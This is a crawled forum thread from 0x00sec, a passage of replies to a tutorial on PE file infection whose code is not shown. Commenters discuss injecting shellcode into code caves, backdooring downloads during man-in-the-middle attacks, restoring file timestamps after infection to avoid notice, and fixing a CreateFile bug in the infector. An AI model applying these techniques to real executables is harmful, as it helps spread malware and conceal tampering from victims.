<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T13:58:05Z" class="post-time">
May 19, 2016, 1:58pm
</time>
<meta itemprop="dateModified" content="2016-05-19T13:58:05Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>On-the-fly application backdooring? Could you be more descriptive? I havenâ€™t touched MSF in years.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T13:59:02Z" class="post-time">
May 19, 2016, 1:59pm
</time>
<meta itemprop="dateModified" content="2016-05-19T13:59:02Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>If you were in a MITM attack, it could Intercept downloaded executables, backdoor them, and give the victim the backdoored version.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T14:06:05Z" class="post-time">
May 19, 2016, 2:06pm
</time>
<meta itemprop="dateModified" content="2016-05-19T14:06:05Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Sorry, I donâ€™t know the implementation of that. Perhaps if you could provide me the source or an infected file, I might be able to figure something out.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T14:15:22Z" class="post-time">
May 19, 2016, 2:15pm
</time>
<meta itemprop="dateModified" content="2016-05-19T14:15:22Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Iâ€™m sorry since my code literacy in C++ is pretty poor, but does this code automatically find code caves? Or do you have to manually find them.</p>
<p>Would this code be able to be executed just given an executable? Also, could this in theory run natively on a Linux system?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T14:22:25Z" class="post-time">
May 19, 2016, 2:22pm
</time>
<meta itemprop="dateModified" content="2016-05-19T14:37:36Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>The infector will point to the last section of the PE file and attempt to locate a code cave which is big enough to house the shellcode.</p>
<p>There is a limitation on potential targets which I did forget to mention. For this example, since the MessageBoxA function resides within <code>user32.dll</code>, it will only work if the target imports that DLL.</p>
<p>This code is Win32 only because it uses the WinAPI but conceptually it can theoretically be carried across over to Linux machines. IIRC, Both the PE and ELF binaries are derived from the COFF. Iâ€™m not 100% sure about this because Iâ€™m not familiar with the structure of the ELF so youâ€™ll have to ask <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T16:34:01Z" class="post-time">
May 19, 2016, 4:34pm
</time>
<meta itemprop="dateModified" content="2016-05-19T16:34:01Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I believe ELF is not derived from COFF, however, concepts as segments, libraries or relocation are required and, on one way or another, reflected in the format.</p>
<p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> with some data definitions, it will be possible to compile it on Linux and run it to infect PE executablesâ€¦ but it will not work on ELF binaries if that is what you meant</p>
<p>FYI: Iâ€™m almost done with an ELF version of this great post.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T20:43:01Z" class="post-time">
May 19, 2016, 8:43pm
</time>
<meta itemprop="dateModified" content="2016-05-19T20:43:01Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Oh right. Okay. I was talking more about backdooring windows applications, using Linux.</p>
<p>However I am exited to see your tutorial!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-20T05:10:39Z" class="post-time">
May 20, 2016, 5:10am
</time>
<meta itemprop="dateModified" content="2016-05-20T05:10:39Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote group-VIP" data-username="pry0cc" data-post="11" data-topic="401">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar"> pry0cc:</div>
<blockquote>
<p>I was talking more about backdooring windows applications, using Linux.</p>
</blockquote>
</aside>
<p>That is indeed possible, at the end you are just reading/writing and moving around bytes in a file. I went quickly through <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> code and I havenâ€™t see any specific Windows code, except the types definitionsâ€¦ But I may have olverlooked something.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/random-man"><span itemprop="name">random-man</span></a>
(random-man)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-24T07:45:47Z" class="post-time">
May 24, 2016, 7:45am
</time>
<meta itemprop="dateModified" content="2016-05-24T07:45:47Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Cool. Thanks DTM. I just learned how to inject code into a PE with Ollydbg, but Iâ€™ve been having trouble automating the process with WINAPI. This helps me understand a lot more.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Ninja243"><span itemprop="name">Ninja243</span></a>
(Mweya Ruider)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-31T13:25:22Z" class="post-time">
May 31, 2016, 1:25pm
</time>
<meta itemprop="dateModified" content="2016-05-31T13:25:22Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Epic tutorial!</p>
<p>This post got me thinking if one could do this in Python, so one thing led to another, I dropped the idea and found PEInjector that seems to do the same thing while performing an MITM attack, so you wouldnâ€™t need to use Social Engineering to get the application on the targetâ€™s computer <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-02-10T09:21:42Z" class="post-time">
February 10, 2017, 9:21am
</time>
<meta itemprop="dateModified" content="2017-02-10T09:21:42Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I am going to try this in wine with STELFâ€¦ Wish me luck.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-02-10T09:46:24Z" class="post-time">
February 10, 2017, 9:46am
</time>
<meta itemprop="dateModified" content="2017-02-10T09:46:24Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>If youâ€™re going to do that, Iâ€™d suggest you add in something that stores the initial fileâ€™s dates before modifications and then reapplying it to the file after you infect it.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-02-10T10:12:41Z" class="post-time">
February 10, 2017, 10:12am
</time>
<meta itemprop="dateModified" content="2017-02-10T10:12:41Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Oh sweet. Is that just simple metadata modification? Also, would that affect the signature? I would like to find a way to sign executables so as to remove the â€œthis publisher isnâ€™t trustedâ€ message.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-02-10T10:55:11Z" class="post-time">
February 10, 2017, 10:55am
</time>
<meta itemprop="dateModified" content="2017-02-10T11:09:28Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yeah, I guess. If youâ€™re infecting an executable by adding extra data, of course the resulting binaryâ€™s signature will be compromised. If you want to sign an executable without the warning message, youâ€™ll need to acquire a certificate from a trusted authority like Verisign, or perhaps you can check out <a href="https://msdn.microsoft.com/en-us/library/aa387764.aspx">Microsoftâ€™s SignTool</a>.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Joe_Schmoe"><span itemprop="name">Joe_Schmoe</span></a>
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-02-10T10:57:12Z" class="post-time">
February 10, 2017, 10:57am
</time>
<meta itemprop="dateModified" content="2017-02-10T10:57:12Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Avoiding the untrusted publisher pop-up would be simple, we just need to steal Microsoftâ€™s private keys which they use to sign programs.</p>
<p>As to changing file modification dates, it will be easy to do. You can do it with powershell or python.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tsukuyomi"><span itemprop="name">tsukuyomi</span></a>
(hash)
</span>
<link itemprop="mainEntityOfPage" href="401.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-02-13T00:01:30Z" class="post-time">
February 13, 2017, 12:01am
</time>
<meta itemprop="dateModified" content="2017-02-13T00:18:47Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Shouldnâ€™t you use OPEN_EXISTING instead of OPEN_ALWAYS when calling CreateFile?</p>
<p>If the file doesnâ€™t exist, OPEN_EXISTING will return an error code. OPEN_ALWAYS will create a new file if it doesnâ€™t already exist, you then call GetFileSize and retrieve the size of the empty file and attempt to map the empty file into memory.</p>
<p>MSDN (CreateFileMapping functionâ€™s fourth parameter):</p>
<pre><code>The low-order DWORD of the maximum size of the file mapping object.

If this parameter and dwMaximumSizeHigh are 0 (zero), the maximum size of the file mapping object is equal to the current size of the file that hFile identifies.

An attempt to map a file with a length of 0 (zero) fails with an error code of ERROR_FILE_INVALID. Applications should test for files with a length of 0 (zero) and reject those files.
</code></pre>
<p>^ â€œApplications should test for files with a length of 0 (zero) and reject those files.â€</p>
<p>CreateFileMapping &amp; MapViewOfFile will both fail if CreateFile creates a new file. CreateFileMapping fails because the file size of the newly created file is zero and MapViewOfFile fails because CreateFileMapping returns NULL to its handle after failing. CreateFileMapping returns ERROR_FILE_INVALID(1006) and MapViewOfFile returns ERROR_INVALID_HANDLE(6). Change CreateFileâ€™s dwCreationDisposition parameter to OPEN_EXISTING.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="../pe-file-infection/401%3Fpage=2.html">next page â†’</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
